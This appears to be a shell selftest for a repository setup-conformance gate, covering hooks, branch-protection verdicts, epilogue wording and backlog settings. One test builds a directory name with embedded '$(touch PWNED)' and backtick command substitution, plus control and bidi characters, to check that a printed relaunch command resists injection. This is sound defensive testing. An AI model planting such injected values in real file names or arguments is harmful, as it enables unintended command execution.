  st_hasnt "is missing or invalid (fail-closed)"

  # (e) adapter.json missing -> fail-closed FAIL
  echo "--- (e) adapter.json missing ---"
  d=$(st_mkfix e claude-code); st_install_hook "$d"; rm -f "$d/adapters/claude-code/adapter.json"
  st_run "$d"
  st_has "adapters/claude-code/adapter.json missing, cannot classify 'claude-code'"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (e2) adapter.json invalid (level unreadable) -> fail-closed FAIL
  echo "--- (e2) adapter.json invalid ---"
  d=$(st_mkfix e2 claude-code); st_install_hook "$d"; printf 'not json{' > "$d/adapters/claude-code/adapter.json"
  st_run "$d"
  st_has "command-guard level unreadable"
  st_has "FAIL: Inception-Done gate not satisfied"
  st_rc 1

  # (f) brownfield foreign pre-push (no kit marker) -> PASS-with-note, not a hook FAIL.
  # Assert the foreign-hook leg (repo live + "foreign hook preserved" note + no hook FAIL), NOT the
  # whole-gate verdict — export/ADR/BACKLOG-independent, same rationale as (c)/(d).
  echo "--- (f) foreign pre-push hook (brownfield) ---"
  d=$(st_mkfix f claude-code); printf '#!/bin/sh\necho foreign\nexit 0\n' > "$d/.git/hooks/pre-push"; chmod +x "$d/.git/hooks/pre-push"
  st_run "$d" surface
  st_has "PASS: git repository present"
  st_has "foreign hook preserved"
  st_hasnt "FAIL: pre-push git hook"

  # (g) K9 — pre-incept HEAD: a commit EXISTS but HEAD does NOT track hooks/pre-push (it predates
  # inception). The broken clone fast-path would copy that INCOMPLETE tree and the resulting template
  # would silently LACK hooks/pre-push. seed_fixture_template must gate the clone on HEAD tracking
  # hooks/pre-push and fall back to the worktree-seed, so the template DOES contain hooks/pre-push.
  # This drives seed_fixture_template directly (the fixture-BUILD layer), which the (a)-(f) cases,
  # keyed off the already-built $WORK/tmpl, cannot reach.
  echo "--- (g) K9 pre-incept HEAD (worktree-seed fallback) ---"
  PRE="$WORK/g-pre"; PRETMPL="$WORK/g-tmpl"   # PRETMPL must NOT pre-exist (clone fast-path needs it absent)
  mkdir -p "$PRE/hooks"
  printf '#!/bin/sh\n# KIT_GUARD_CORE\n' > "$PRE/hooks/pre-push"   # incepted worktree marker, UNTRACKED
  printf 'spec\n' > "$PRE/SPEC.md"
  git -C "$PRE" init -q
  git -C "$PRE" add SPEC.md   # commit ONLY the spec-only file => a genuine pre-incept HEAD
  git -C "$PRE" -c user.email=selftest@kit -c user.name=selftest commit -qm "pre-incept spec-only" >/dev/null 2>&1
  if seed_fixture_template "$PRE" "$PRETMPL" >/dev/null 2>&1 && [ -f "$PRETMPL/hooks/pre-push" ]; then
    printf '    ok  : pre-incept-HEAD seed contains hooks/pre-push (worktree-seed, not the broken clone)\n'
  else
    printf '    BAD : pre-incept-HEAD seed LACKS hooks/pre-push (clone copied an incomplete HEAD — K9)\n'; st_fail=1
  fi

  # ── Branch-protection leg (K5): every mode×host cell asserts a discriminating MESSAGE, not just rc.
  # (h) GitHub, verified-unprotected (bp exit 1) -> FAIL both modes
  echo "--- (h) github unprotected (bp exit 1) ---"
  d=$(st_mkfix h claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 1
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "NOT protected"; st_rc 1
  st_run "$d" surface; st_has "FAIL: branch protection"

  # (h0) GitHub, protected (bp exit 0) -> PASS verified
  echo "--- (h0) github protected (bp exit 0) ---"
  d=$(st_mkfix h0 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  st_run "$d" strict;  st_has "PASS: verified protected"

  # (h4) GitHub, protected but a DECLARED context unbound (bp exit 1 naming it) -> strict FAIL / surface
  # OUTSTANDING, naming the context and the --apply remedy — never the generic "NOT protected" text
  # (V1 repair PR 2: an incepted repo declares the gates it installed; unbound = fail-open, refused by name).
  echo "--- (h4) github protected, declared context unbound (bp exit 1 + FAIL line) ---"
  d=$(st_mkfix h4 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 1 'FAIL: required-check context(s) declared in REQUIRED-CHECKS.md but not live on main: backlog-presence ceremony-binding — run: sh scripts/branch-protection-apply.sh --apply'
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "NOT bound: backlog-presence ceremony-binding"; st_has "branch-protection-apply.sh --apply"; st_hasnt "NOT protected"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_has "NOT bound: backlog-presence ceremony-binding"; st_hasnt "FAIL: branch protection"
  # (h4m) MIRROR LOCK: h4 pins the parser against a hand-copied literal, so the producer could be reworded
  # with every cell green. Assert the REAL producer still emits both anchors the parser keys on.
  echo "--- (h4m) producer wording mirror (conformance/branch-protection.sh) ---"
  _bpsrc="$(dirname "$CI_GATES_SH")/branch-protection.sh"   # the kit's own, resolved like ci-gates.sh — never the fixture's stub
  if grep -q 'FAIL: required-check context(s) declared in .* but not live on .* — run: ' "$_bpsrc"; then echo "    ok  : producer anchors present (one line: prefix, on <branch>:, — run:)"; else echo "    FAIL: conformance/branch-protection.sh no longer emits the one-line 'FAIL: required-check context(s) declared in … but not live on …: … — run: …' inception-done parses — update BOTH sides"; st_fail=1; fi
  # (h6-rd4) RD-4: a declared-but-vacuous tracker-board-gates (branch-protection.sh's new FAIL, T5)
  # must surface as a hard FAIL in BOTH modes through this leg's EXISTING routing — it matches no
  # special-cased anchor (h4's unbound-context line, h5's compound case), so it falls to the generic
  # "print the FAIL line(s), fail=1" arm; asserting that here locks in that no future special-case
  # anchor accidentally downgrades it to OUTSTANDING/advisory.
  echo "--- (h6-rd4) declared-but-vacuous tracker-board-gates (bp exit 1) -> FAIL both modes, never advisory ---"
  d=$(st_mkfix h6rd4 claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub "$d" 1 "FAIL: tracker-board-gates is declared required but this tree's backlog backend is md — the trusted job skips on md, so the context would be always-green; remove it from REQUIRED-CHECKS.md and from branch protection (see RUNBOOK, reverting a tracker)"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "tracker-board-gates is declared required"; st_hasnt "OUTSTANDING"; st_rc 1
  st_run "$d" surface; st_has "FAIL: branch protection"; st_hasnt "OUTSTANDING: branch protection"

  # (h6-rd4m) MIRROR LOCK (RT5-Q5): a leg greps the REAL branch-protection.sh for the exact RD-4 FAIL
  # sentence h6-rd4/h6-rd4-offline hand-copy into their stubs, so the stubbed copy cannot silently
  # drift from the producer's own wording.
  echo "--- (h6-rd4m) producer wording mirror (RD-4 vacuous-tracker FAIL sentence) ---"
  if grep -qF "tracker-board-gates is declared required but this tree's backlog backend is md — the trusted job skips on md, so the context would be always-green; remove it from REQUIRED-CHECKS.md and from branch protection" "$_bpsrc"; then
    echo "    ok  : producer's RD-4 FAIL sentence present verbatim"
  else
    echo "    FAIL: conformance/branch-protection.sh no longer emits the RD-4 vacuous-tracker FAIL sentence h6-rd4/h6-rd4-offline pin — update BOTH sides"; st_fail=1
  fi

  # (h6-rd4-offline) RT5-Q4: the LIVE leg is unverifiable (bp --raw exit 2) but the OFFLINE RD-4
  # check (bp --declared-only) still runs and still refuses — its own FAIL line, never folded into
  # the "GitHub state unverifiable" summary, and never downgraded to OUTSTANDING by --surface (the
  # vacuous-tracker defect is not a GitHub-reachability problem; it is always-actionable locally).
  echo "--- (h6-rd4-offline) live leg unverifiable (rc 2) + offline RD-4 declared-only leg FAILs separately ---"
  d=$(st_mkfix h6rd4off claude-code); st_install_hook "$d"; st_gh "$d"
  st_bpstub_split "$d" 2 1 "FAIL: tracker-board-gates is declared required but this tree's backlog backend is md — the trusted job skips on md, so the context would be always-green; remove it from REQUIRED-CHECKS.md and from branch protection (see RUNBOOK, reverting a tracker)"
  st_run "$d" strict;  st_has "FAIL: branch protection — tracker-board-gates is declared required"; st_has "GitHub state unverifiable"; st_rc 1
  st_run "$d" surface; st_has "FAIL: branch protection — tracker-board-gates is declared required"; st_has "OUTSTANDING: branch protection — GitHub state unverifiable"

  # (h5) COMPOUND rc 1 — unbound line PLUS another FAIL (no reviews required): the friendly arm must NOT be taken in either mode.
  echo "--- (h5) github unbound + reviews-not-required (compound rc 1) -> FAIL both modes ---"
  d=$(st_mkfix h5 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 1 'FAIL: required PR reviews are not enabled on main
FAIL: required-check context(s) declared in REQUIRED-CHECKS.md but not live on main: backlog-presence — run: sh scripts/branch-protection-apply.sh --apply'
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "NOT protected"; st_hasnt "OUTSTANDING"; st_rc 1
  st_run "$d" surface; st_has "FAIL: branch protection"; st_hasnt "OUTSTANDING: branch protection"

  # (h2) GitHub, unverifiable (bp exit 2) -> strict FAIL / surface OUTSTANDING. Both rc-2 messages
  # must state BOTH causes (D(i), A3): rc 2 is measured with authenticated gh + a nonexistent repo,
  # so "(no gh / unauthenticated)" alone is a wrong remedy.
  echo "--- (h2) github unverifiable (bp exit 2) ---"
  d=$(st_mkfix h2 claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 2
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "unverifiable"; st_has "inaccessible/nonexistent"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_has "inaccessible/nonexistent"; st_hasnt "FAIL: branch protection"

  # (h3) LIVENESS: REAL branch-protection.sh (no stub), forced no-gh -> raw exit 2 -> OUTSTANDING (surface)
  # proves the leg actually invokes the real script with --raw, not only the stub.
  echo "--- (h3) github unverifiable via REAL script (BP_FORCE_NO_GH) ---"
  d=$(st_mkfix h3 claude-code); st_install_hook "$d"; st_gh "$d"
  OUT=$( ( export BP_FORCE_NO_GH=1; MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: branch protection"

  # (i) non-GitHub, attested -> PASS attested
  echo "--- (i) non-github attested ---"
  d=$(st_mkfix i claude-code); st_install_hook "$d"; st_nongh "$d"; st_attest "$d"
  st_run "$d" strict;  st_has "PASS: branch protection attested (non-GitHub host)"

  # (i2) non-GitHub, NOT attested -> strict FAIL / surface OUTSTANDING
  echo "--- (i2) non-github unattested ---"
  d=$(st_mkfix i2 claude-code); st_install_hook "$d"; st_nongh "$d"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "no valid recorded attestation"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"

  # (i3) non-GitHub, PLACEHOLDER attestation left unfilled -> fail-closed (NOT a valid attestation)
  echo "--- (i3) non-github placeholder attestation ---"
  d=$(st_mkfix i3 claude-code); st_install_hook "$d"; st_nongh "$d"
  printf '%s\n' '- **Branch protection** (§branch-protection): attested: <host + mechanism>' >> "$d/CLAUDE.md"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "no valid recorded attestation"; st_rc 1
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"

  # (j) no remote, strict -> FAIL
  echo "--- (j) no remote, strict ---"
  d=$(st_mkfix j claude-code); st_install_hook "$d"; st_norem "$d"
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_has "no remote configured"; st_rc 1

  # (k) no remote, surface -> OUTSTANDING
  echo "--- (k) no remote, surface ---"
  d=$(st_mkfix k claude-code); st_install_hook "$d"; st_norem "$d"
  st_run "$d" surface; st_has "OUTSTANDING: branch protection"; st_hasnt "FAIL: branch protection"

  # (l) GitHub, unknown bp exit (3) -> fail-closed FAIL
  echo "--- (l) github unknown bp exit -> fail-closed ---"
  d=$(st_mkfix l claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 3
  st_run "$d" strict;  st_has "FAIL: branch protection"; st_rc 1

  # (m) A3 lock — the incept epilogue: the printed next-steps must name the FIRST-commit step
  # (docs/adoption/inception-bootstrap.md) and the stage-appropriate verify (--surface now; the bare
  # strict command only once a protected remote exists — strict's no-remote arm is FAIL by design and
  # stays asserted UNCHANGED by (j)/(k) above). Load-bearing negative: an epilogue printing the bare
  # strict command as the immediate verify ("Verify: sh conformance/inception-done.sh") is the
  # measured cold-adopter defect and must FAIL here. Drives scripts/incept.sh's argument-borne
  # __emit-epilogue seam — the real emitter, no full inception run.
  echo "--- (m) incept epilogue: commit step + stage-appropriate verify ---"
  if [ ! -f "$ROOT/scripts/incept.sh" ]; then
    # Review Minor 2: honest fallback — an adopter tree that deleted incept post-inception has no
    # emitter to lock; say so instead of an opaque rc-127 red. Never n/a on a tree that ships it.
    echo "selftest n/a: (m) skipped — $ROOT/scripts/incept.sh absent (epilogue emitter not on this tree)"
  else
  OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue 2>&1 ); RC=$?
  st_rc 0
  st_has "Commit the incepted baseline — the FIRST commit"
  st_has "Verify now: sh conformance/inception-done.sh --surface"
  st_has "Verify when a protected remote exists: sh conformance/inception-done.sh"
  st_hasnt "Verify: sh conformance/inception-done.sh"
  # SWAS-907 C4: each pre-baseline step names its actor and the one draft; the push names the agent and the read-back.
  st_has "One draft carries CLAUDE.md §1 (charter: problem, vision, success metrics, scope), §3 (per-project config: autonomy tiers, SLO, operator fluency, review routing, WIP) and §4 (roles): the agent writes docs/inception-draft/PROJECT-CLAUDE.md from your words; a person pastes all three into CLAUDE.md before the baseline commit"
  st_has "the agent commits the baseline after your paste, then runs git push origin main and reads it back with git ls-remote --heads origin main"
  st_has "done in step 1's draft and pasted before the baseline commit"
  st_has "the guard refuses the agent's own write to CLAUDE.md (Edit, Write or a shell write); later edits go through a dev clone and a PR"
  # SWAS-907 R1 order: the draft-and-paste text comes before the baseline commit step.
  _ln_draft=$(printf '%s\n' "$OUT" | grep -n "a person pastes all three into CLAUDE.md before the baseline commit" | head -n 1 | cut -d: -f1)
  _ln_commit0=$(printf '%s\n' "$OUT" | grep -n "Commit the incepted baseline" | head -n 1 | cut -d: -f1)
  if [ -n "$_ln_draft" ] && [ -n "$_ln_commit0" ] && [ "$_ln_draft" -lt "$_ln_commit0" ]; then
    echo "GOOD: epilogue order — draft-and-paste ($_ln_draft) < baseline commit ($_ln_commit0)"
  else
    echo "BAD : epilogue ORDER wrong — draft=$_ln_draft commit=$_ln_commit0 (the draft-and-paste text must precede the baseline commit)"
    st_fail=1
  fi
  # SWAS-907 R2: the protect step branches on the governance answer, as new.sh's owed line does.
  _OUT_SAVE=$OUT
  OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue --team team 2>&1 )
  st_has "scripts/branch-protection-apply.sh --replace --team on an unprotected main"
  st_has "in a real terminal, with an admin credential (docs/operations/forge-identity-switch.md, step 5)"
  OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue --team solo 2>&1 )
  st_has "scripts/branch-protection-apply.sh --replace on an unprotected main"
  st_hasnt "--replace --team"
  OUT=$_OUT_SAVE
  # SWAS-316: the closing output tells the person where to launch the agent session (the guard loads only from the launch directory).
  # SWAS-934 E1: the label is a whole line of its own; the command is the next line (the cells below read it).
  if printf '%s\n' "$OUT" | grep -qxF "Start your agent session here:"; then echo "    ok  : the launch label is a line of its own"; else echo "    FAIL: the closing output lacks the whole line 'Start your agent session here:'"; st_fail=1; fi
  # Review Minor 1: ORDER is part of the claim ("says the right things in the right ORDER") — the
  # commit step must precede "Verify now", which must precede the strict line. Presence alone
  # passed a mutation that relocated the commit step after the verify lines; these line-number
  # comparisons close that.
  _ln_commit=$(printf '%s\n' "$OUT" | grep -n "Commit the incepted baseline" | head -n 1 | cut -d: -f1)
  _ln_snow=$(printf '%s\n' "$OUT" | grep -n "Verify now:" | head -n 1 | cut -d: -f1)
  _ln_strict=$(printf '%s\n' "$OUT" | grep -n "Verify when a protected remote exists:" | head -n 1 | cut -d: -f1)
  if [ -n "$_ln_commit" ] && [ -n "$_ln_snow" ] && [ -n "$_ln_strict" ] \
     && [ "$_ln_commit" -lt "$_ln_snow" ] && [ "$_ln_snow" -lt "$_ln_strict" ]; then
    echo "GOOD: epilogue order — commit step ($_ln_commit) < Verify now ($_ln_snow) < strict ($_ln_strict)"
  else
    echo "BAD : epilogue ORDER wrong — commit=$_ln_commit verify-now=$_ln_snow strict=$_ln_strict (commit step must come first, staged verify lines after, strict last)"
    st_fail=1
  fi
  # SWAS-934: the relaunch line. Every cell drives the same argument-borne seam (--names, --root); no environment variable selects a form.
  _rl_has() {
    case "$OUT" in
      *"$2"*) echo "PASS: $1: $3" ;;
      *) echo "FAIL: $1: $3 (missing '$2')"; st_fail=1 ;;
    esac
  }
  _rl_hasnt() {
    case "$OUT" in
      *"$2"*) echo "FAIL: $1: $3 (found '$2')"; st_fail=1 ;;
      *) echo "PASS: $1: $3" ;;
    esac
  }
  _rl_cmdline() {  # -> the line right after the whole-line label, exactly as printed
    printf '%s\n' "$OUT" | awk 'p { print; exit } $0 == "Start your agent session here:" { p = 1 }'
  }
  _rl_split() {  # <id> <command-shape> : the label is its own line, the next line holds only the command, and the note follows it
    if printf '%s\n' "$OUT" | grep -qxF "Start your agent session here:"; then echo "PASS: $1: the label is a line of its own"; else echo "FAIL: $1: the label is not a line of its own"; st_fail=1; fi
    _rs_cmd=$(_rl_cmdline)
    case "$_rs_cmd" in
      "  cd '"*"$2") echo "PASS: $1: the next line holds only the command" ;;
      *) echo "FAIL: $1: the line under the label is not only the command ('$_rs_cmd')"; st_fail=1 ;;
    esac
    _rs_note=$(printf '%s\n' "$OUT" | awk 'p { print; exit } $0 == "Start your agent session here:" { getline; p = 1 }')
    case "$_rs_note" in
      "(Not a parent or a subfolder: the guard loads only from the launch directory.)") echo "PASS: $1: the note follows the command" ;;
      *) echo "FAIL: $1: the note does not follow the command ('$_rs_note')"; st_fail=1 ;;
    esac
  }
  _rl_paste() {  # <id> <names, space list or empty> : the command line under the label, exactly as printed, parses and runs for real into a stub claude (E1)
    _pb=$(mktemp -d); mkdir -p "$_pb/bin" "$_pb/cwd"
    printf '%s\n' '#!/bin/sh' 'pwd -P' 'for _n in CLAUDE_CONFIG_DIR GH_CONFIG_DIR GIT_CONFIG_GLOBAL GIT_CONFIG_NOSYSTEM; do' '  eval "_v=\${$_n:-}"' '  if [ -n "$_v" ]; then printf "set:%s\n" "$_n"; fi' 'done' > "$_pb/bin/claude"; chmod +x "$_pb/bin/claude"
    _pr="$_pb/it's \"q\" \$(touch PWNED) \`touch PWNED2\`"; mkdir -p "$_pr"
    if [ -n "$2" ]; then OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue --root "$_pr" --names "$2" 2>&1 ); else OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue --root "$_pr" 2>&1 ); fi
    _rl_cmdline > "$_pb/line.sh"
    if [ -s "$_pb/line.sh" ] && sh -n "$_pb/line.sh" 2>/dev/null; then echo "PASS: $1: the command line, as printed, parses"; else echo "FAIL: $1: the command line, as printed, does not parse"; st_fail=1; fi
    _pout=$( cd "$_pb/cwd" && env PATH="$_pb/bin:$PATH" CLAUDE_CONFIG_DIR=sentinel-p-1 GH_CONFIG_DIR=sentinel-p-2 sh "$_pb/line.sh" 2>&1 ) || true
    _pwant=$( cd "$_pr" && pwd -P )
    case "$_pout" in
      "$_pwant"*) echo "PASS: $1: run for real, it lands in the hostile root" ;;
      *) echo "FAIL: $1: it did not land in the root (stub says '$_pout')"; st_fail=1 ;;
    esac
    if [ -n "$2" ]; then
      case "$_pout" in
        *"set:CLAUDE_CONFIG_DIR"*"set:GH_CONFIG_DIR"*) echo "PASS: $1: the recorded names arrive set" ;;
        *) echo "FAIL: $1: the recorded names did not arrive set ('$_pout')"; st_fail=1 ;;
      esac
    fi
    if [ ! -e "$_pb/cwd/PWNED" ] && [ ! -e "$_pb/cwd/PWNED2" ]; then echo "PASS: $1: no command inside the root's name ran"; else echo "FAIL: $1: a command inside the root's name ran"; st_fail=1; fi
    rm -rf "$_pb"
  }
  echo "--- (m-relaunch) the plain form: the label on its own line, then only the command ---"
  _rl_split relaunch-plain " && claude"
  _rl_has relaunch-plain "Then check, once: /hooks lists a PreToolUse hook running .claude/hooks/guard.sh, and /status shows Project settings on its Setting sources line." "the /hooks and /status line follows"
  _rl_hasnt relaunch-plain "env -i" "no redirected form without names"
  echo "--- (m-relaunch) the redirected form: references, never values ---"
  OUT=$( env CLAUDE_CONFIG_DIR=sentinel-c-5d2f GH_CONFIG_DIR=sentinel-g-5d2f sh "$ROOT/scripts/incept.sh" __emit-epilogue --names "CLAUDE_CONFIG_DIR GH_CONFIG_DIR" 2>&1 )
  _rl_split relaunch-redirected " && env -i HOME=\"\$HOME\" PATH=\"\$PATH\" TERM=\"\$TERM\" CLAUDE_CONFIG_DIR=\"\$CLAUDE_CONFIG_DIR\" GH_CONFIG_DIR=\"\$GH_CONFIG_DIR\" claude"
  _rl_has relaunch-redirected "This session runs with a redirected environment: CLAUDE_CONFIG_DIR GH_CONFIG_DIR. Paste the line below" "the sentence names the recorded variables"
  _rl_has relaunch-redirected "sh scripts/preflight.sh names any of these that the new session lacks." "the check line points at preflight"
  _rl_hasnt relaunch-redirected "GIT_CONFIG_GLOBAL" "a name that was not recorded is not carried"
  _rl_hasnt relaunch-redirected "sentinel-" "no variable's value is in the output"
  echo "--- (m-relaunch) paste: each form's command line, as printed, parses and runs in the hostile root ---"
  _rl_paste relaunch-paste-plain ""
  _rl_paste relaunch-paste-redirected "CLAUDE_CONFIG_DIR GH_CONFIG_DIR"
  echo "--- (m-relaunch) refusal: a root a human cannot read gets a notice, never a line to paste ---"
  for _rc_case in newline cr bidi; do
    case "$_rc_case" in
      newline) _rr=$(printf 'a\nb') ;;
      cr) _rr=$(printf 'a\rb') ;;
      bidi) _rr=$(printf 'a\342\200\256b') ;;
    esac
    OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue --root "$_rr" 2>&1 )
    _rl_has "relaunch-refuse-$_rc_case" "the project root holds a control, bidi or zero-width character, so no line is printed to paste; cd into it by hand and start the session there." "the notice is printed"
    _rl_hasnt "relaunch-refuse-$_rc_case" "Start your agent session here: cd " "no line to paste is printed"
    if [ -z "$(_rl_cmdline)" ]; then echo "PASS: relaunch-refuse-$_rc_case: no command line follows the notice"; else echo "FAIL: relaunch-refuse-$_rc_case: a command line follows a label"; st_fail=1; fi
    _rl_hasnt "relaunch-refuse-$_rc_case" "  cd '" "no indented command line is printed"
  done
  echo "--- (m-relaunch) a root that is not valid UTF-8: the notice or a correct line, never cd '' ---"
  OUT=$( sh "$ROOT/scripts/incept.sh" __emit-epilogue --root "$(printf 'a\377b')" 2>&1 )
  _rl_hasnt relaunch-invalid-utf8 "cd ''" "no empty-root line is printed"
  case "$OUT" in
    *"the project root holds a control, bidi or zero-width character"*) echo "PASS: relaunch-invalid-utf8 the notice is printed" ;;
    *"  cd 'a"*) echo "PASS: relaunch-invalid-utf8 a line naming the root is printed" ;;
    *) echo "FAIL: relaunch-invalid-utf8 neither the notice nor a line naming the root"; st_fail=1 ;;
  esac
  fi

  # (n) B6 rider (a): an UNFILLED CHOICE-LIST backend declaration — CLAUDE.md's field still reads
  # `Backlog backend (§...): [md/github/jira/ado/linear/gitlab]` — with NO BACKLOG.md present must
  # FAIL. This is the MEASURED defect this rider fixes: the old literal `grep -q "Backlog backend"`
  # matched the FIELD NAME regardless of whether its value was ever actually chosen, so this exact
  # tree passed Inception-Done and then every board gate (backlog-presence, backlog-current) silently
  # N/A'd forever, because resolve_backend correctly reads an unfilled choice-list as UNDECLARED. A
  # regression here means Inception-Done and the board gates disagree again about what "declared"
  # means. Assert the SPECIFIC leg, not the whole-gate verdict (same rationale as (c)/(d)/(f) above).
  echo "--- (n) unfilled choice-list backlog backend (measured defect, rider a negative) ---"
  d=$(st_mkfix n claude-code); st_install_hook "$d"
  # The fixture template is cloned from THIS repo's own tracked tree, which carries its OWN real
  # BACKLOG.md — remove it so the fixture genuinely represents "no board, no declared backend" (the
  # measured defect's actual precondition), not "board present" (a different, already-PASS leg).
  rm -f "$d/BACKLOG.md"
  printf '%s\n' '- **Backlog backend** (§6): [md/github/jira/ado/linear/gitlab]' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "FAIL missing: BACKLOG.md or a declared backlog backend"
  st_hasnt "PASS present: backlog"

  # (o) B6 rider (a): an UNRECOGNIZED/fat-fingered backend token must FAIL-CLOSED, never be read as
  # "no backend declared" (which would silently N/A the board gates instead of naming the typo).
  echo "--- (o) unrecognized backlog backend token (rider a fail-closed) ---"
  d=$(st_mkfix o claude-code); st_install_hook "$d"
  printf '%s\n' '- **Backlog backend** (§6): markdow' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "FAIL: backlog backend 'markdow' is not a recognized token"

  # (p) B6 rider (a) positive: a VALID, filled backend declaration must PASS this leg even with no
  # BACKLOG.md on disk yet (e.g. a jira/ado backend never has one) — the fix must not narrow the
  # legitimate non-md case.
  echo "--- (p) valid non-md backend declared (rider a positive) ---"
  d=$(st_mkfix p claude-code); st_install_hook "$d"
  printf '%s\n' '- **Backlog backend** (§6): jira' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "PASS present: backlog (declared backend: jira)"

  # (p2) SWAS-844: `sparkwright new` stamps the intent owner as `[owed]`; that must read as unfilled, like `[who owns the why]`.
  echo "--- (p2) Intent owner stamped [owed] reads as unfilled ---"
  d=$(st_mkfix p2 claude-code); st_install_hook "$d"
  printf '%s\n' '**Intent owner:** [owed]' >> "$d/CLAUDE.md"
  st_run "$d" surface
  st_has "FAIL: project CLAUDE.md key fields not filled"
  st_hasnt "PASS: project CLAUDE.md key header fields filled"

  # NON-MD-BACKEND-NEVER-SILENT §3.5a's incept leg (the `board-governance` waiver stamp) is NOT
  # here, and the plan that put it here was wrong on contact: `scripts/incept.sh` refuses any tree
  # carrying kit-internal files, and this gate's fixtures are CLONES OF THE KIT. It lives in
  # conformance/incept-first-run-green.sh, which already builds a real adopter export and runs a
  # live incept inside it — the only fixture shape incept will accept.

  # ── B8 §4.3 (GATE-PROVENANCE-SELF-DISABLES-AND-NEVER-GATES-THE-MERGE, PHASE-B-SPINE) — the
  # repo-class leg: a deployable, private repo without the KIT_ATTEST_PRIVATE declaration cannot pass Inception
  # silently provenance-less, because the SLSA attest step(s) are skipped there (profiles/*/ci.yml's
  # public-or-declared `if:`; SWAS-813). Seam-stubbed via INCEPTION_DONE_GH_CMD (the st_bpstub precedent) and
  # INCEPTION_DONE_GH_VAR_CMD (live only inside this selftest) so fixtures never touch the network.
  _id_mkdisp_apply() { # <dir> — an all-apply 8-id dispositions file (no na anywhere)
    mkdir -p "$1/conformance"
    { for _g in gate-lint gate-type-check gate-test gate-build gate-secret-scan gate-dep-scan gate-sbom gate-provenance; do
        printf '%s\tapply\tfixture\n' "$_g"
      done
    } > "$1/conformance/gate-dispositions.txt"
  }
  _id_mkdisp_na() { # <dir> — 8-id file: gate-provenance na (a validated conscious decision), rest apply.
    # Written EXPLICITLY, never inherited from the template tree: the tmpl is a clone of the ambient
    # repo, and conformance/gate-dispositions.txt is export-ignore'd — a fixture leaning on the
    # tmpl's copy greens on the dev tree and reds on every incepted export (measured: PR #513
    # battery 1, all five export-context verify jobs, fixture (r)). The in-export selftest is the
    # decisive verification for anything export-shipped — fixtures must be tree-hermetic.
    mkdir -p "$1/conformance"
    { for _g in gate-lint gate-type-check gate-test gate-build gate-secret-scan gate-dep-scan gate-sbom; do
        printf '%s\tapply\tfixture\n' "$_g"
      done
      printf 'gate-provenance\tna\tfixture: provenance consciously dispositioned\n'
    } > "$1/conformance/gate-dispositions.txt"
  }
  _priv_stub='printf {"isPrivate":true,"isInOrganization":false}'
  _pub_stub='printf {"isPrivate":false,"isInOrganization":false}'
  _privorg_stub='printf {"isPrivate":true,"isInOrganization":true}'
  # SWAS-813: the variable-read seam. _id_varstub writes a gh-api stand-in into the fixture: it logs each path it is asked
  # ($0.calls), then answers the repository read and the organization read from two snippets of shell. The snippets below
  # are the answers a real read gives: a 404 and a 403 (the failure text `gh api` prints), a repository variable with a
  # value, and an organization list that holds the variable, holds nothing, or holds only a name that is not the exact one.
  _id_varstub() { # <dir> <repo-answer> <org-answer>
    printf '%s\n' '#!/bin/sh' 'echo "$1" >> "$0.calls"' 'case "$1" in' \
      "  */actions/variables/KIT_ATTEST_PRIVATE) $2 ;;" \
      "  */actions/organization-variables) $3 ;;" \
      'esac' > "$1/varstub.sh"
  }
  _vs_404='echo "gh: Not Found (HTTP 404)" >&2; exit 1'
  _vs_403='echo "gh: Resource not accessible by personal access token (HTTP 403)" >&2; exit 1'
  _vs_repo_true='printf "%s\n" "{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"true\"}"'
  _vs_repo_TRUE='printf "%s\n" "{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"TRUE\"}"'
  _vs_repo_false='printf "%s\n" "{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"false\"}"'
  _vs_org_true='printf "%s\n" "{\"total_count\":1,\"variables\":[{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"true\"}]}"'
  _vs_org_none='printf "%s\n" "{\"total_count\":0,\"variables\":[]}"'
  _vs_org_decoy='printf "%s\n" "{\"total_count\":1,\"variables\":[{\"name\":\"KIT_ATTEST_PRIVATE_OTHER\",\"value\":\"true\"}]}"'

  # (q) deployable + private + user-owned + gate-provenance UNDECIDED (apply) -> strict FAIL /
  # surface OUTSTANDING (the spine AC, verbatim: "a private user-owned deployable repo cannot pass
  # Inception silently provenance-less").
  echo "--- (q) gate-provenance repo-class: deployable + private + user-owned -> FAIL/OUTSTANDING ---"
  d=$(st_mkfix q claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"; _id_varstub "$d" "$_vs_404" "$_vs_org_none"
